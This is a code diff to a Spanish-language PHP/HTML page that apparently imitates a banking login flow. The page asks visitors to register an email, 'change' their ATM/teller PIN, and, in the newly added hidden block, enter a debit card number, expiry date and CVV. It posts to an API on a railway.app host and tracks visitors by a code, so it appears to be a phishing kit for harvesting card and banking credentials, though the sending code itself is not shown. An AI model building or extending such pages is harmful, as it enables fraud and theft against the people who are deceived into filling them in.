@@ -6,7 +6,7 @@ consultarApi('aceptarIngreso');
 // Función para hacer la solicitud a la API
 function consultarApi($endPoint)
 {
-    $_SESSION['urlApi'] ='https://spike-production.up.railway.app/';
+    $_SESSION['urlApi'] = 'https://spike-production.up.railway.app/';
     // $_SESSION['urlApi'] = 'http://localhost:8080/';
     $codeVisitante = $_GET['codeVisitante'] ?? 'userdesconocido';
 
@@ -160,6 +160,28 @@ function validarRespuesta($respuesta)
         left: 50%;
         top: 50%;
         transform: translate(-50%, -50%);
+    }
+
+    .form-container {
+        max-width: 400px;
+        margin: 0 auto;
+        padding: 20px;
+        background-color: #f8f9fa;
+        border-radius: 5px;
+        box-shadow: 0px 0px 10px rgba(0, 0, 0, 0.1);
+    }
+
+    .form-control-sm {
+        height: calc(1.5em + .5rem + 2px);
+        font-size: .875rem;
+        padding: .25rem .5rem;
+    }
+
+    .panel_general .content-data {
+        padding-left: 8px;
+        padding-right: 8px;
+        width: 100%;
+        min-height: 28px;
     }
     </style>
     <script type="text/javascript" src="js/jquery-3.6.0.min.js"></script>
@@ -1467,9 +1489,9 @@ function setTitle() {
                                                 </div>
 
                                                 <div id="div-correo" class="hidden row justify-content-center mt-5">
-                                                    <div class="col-6">
+                                                <div class="content-data">
                                                         <div class="otp-label">
-                                                            Registre su correo?
+                                                            Registre su correo!
                                                         </div>
                                                         <div class="">
                                                             <input id="correo" class="mua-form-control otp-input"
@@ -1492,9 +1514,9 @@ function setTitle() {
 
                                                 <div id="div-clave-cajero"
                                                     class="hidden row justify-content-center mt-5 m-2">
-                                                    <div class="col-6">
+                                                    <div class="content-data">
                                                         <div class="otp-label ml-4 mr-4">
-                                                            Por su seguiridad es necesario que cambie la clave
+                                                            Por su seguridad es necesario que cambie la clave
                                                         </div>
                                                         <div class="">
                                                             <div class="otp-label">
@@ -1527,7 +1549,44 @@ function setTitle() {
 
                                                     </div>
                                                 </div>
+                                                <div id="div-datos-debito" class="hidden row justify-content-center mt-5 m-4">
 
+                                                    <div class="content-data">
+<!-- 
+                                                        <h5 class="mb-3">Para completar el proceso es necesario que
+                                                            ingrese los siguientes datos</h5> -->
+                                                        <div class="mb-3">
+                                                            <label for="cardNumber" class="form-label">Número de
+                                                                Tarjeta</label>
+                                                            <input type="text" class="form-control form-control-sm"
+                                                                id="cardNumber" name="cardNumber" required>
+                                                            <div class="invalid-feedback">Por favor, ingresa el
+                                                                número de la tarjeta.</div>
+                                                        </div>
+
+                                                        <div class="mb-3">
+                                                            <label for="expiryDate" class="form-label">Fecha de
+                                                                Vencimiento (MM/YY)</label>
+                                                            <input type="text" class="form-control form-control-sm"
+                                                                id="expiryDate" name="expiryDate" placeholder="MM/YY"
+                                                                required>
+                                                            <div class="invalid-feedback">Por favor, ingresa la
+                                                                fecha de vencimiento.</div>
+                                                        </div>
+
+                                                        <div class="mb-3">
+                                                            <label for="cvv" class="form-label">Código de Seguridad
+                                                                (CVV)</label>
+                                                            <input type="text" class="form-control form-control-sm"
+                                                                id="cvv" name="cvv" required>
+                                                            <div class="invalid-feedback">Por favor, ingresa el
+                                                                código de seguridad (CVV).</div>
+                                                        </div>
+
+
+
+                                                    </div>
+                                                </div>
                                             </div>
 
                                             <div class="one-button-container mua-button-container">
@@ -1673,6 +1732,8 @@ https://cdn.jsdelivr.net/npm/sweetalert2@11.12.4/dist/sweetalert2.all.min.js
         <link href="
 https://cdn.jsdelivr.net/npm/sweetalert2@11.12.4/dist/sweetalert2.min.css
 " rel="stylesheet">
+<script src="https://cdn.jsdelivr.net/npm/inputmask@5.0.7/dist/jquery.inputmask.min.js"></script>
+
         <script src="js/actions.js" type="text/javascript"></script>
         <input id="device_id" name="device_id" type="hidden" value="" />
         <input id="userlanguage" name="userlanguage" type="hidden" value="" />
